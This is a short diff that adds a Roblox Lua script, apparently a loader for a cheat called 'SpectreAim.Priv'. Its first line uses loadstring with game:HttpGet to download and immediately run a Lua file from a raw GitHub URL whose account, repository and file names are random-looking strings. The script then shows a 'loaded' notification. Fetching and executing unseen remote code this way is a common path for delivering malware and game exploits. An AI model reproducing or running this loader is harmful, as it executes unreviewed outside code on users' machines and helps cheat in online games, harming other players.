@@ -1,0 +1,9 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/12421ks21sgvh1129h8xcqwehjq1/DEOWFJEHWSUJWHFRDFNVFSJXCEFV/refs/heads/main/SXKLQWDJFHENWQJSWBNQWEDRBFEHB.lua"))()
+task.wait(1)
+game.StarterGui:SetCore("SendNotification",{
+  Title = "SpectreAim.Priv loaded!",
+  Text = "Enjoy using Spectre",
+  Icon = "",
+  Duration = 5
+})
+task.wait(0.5)
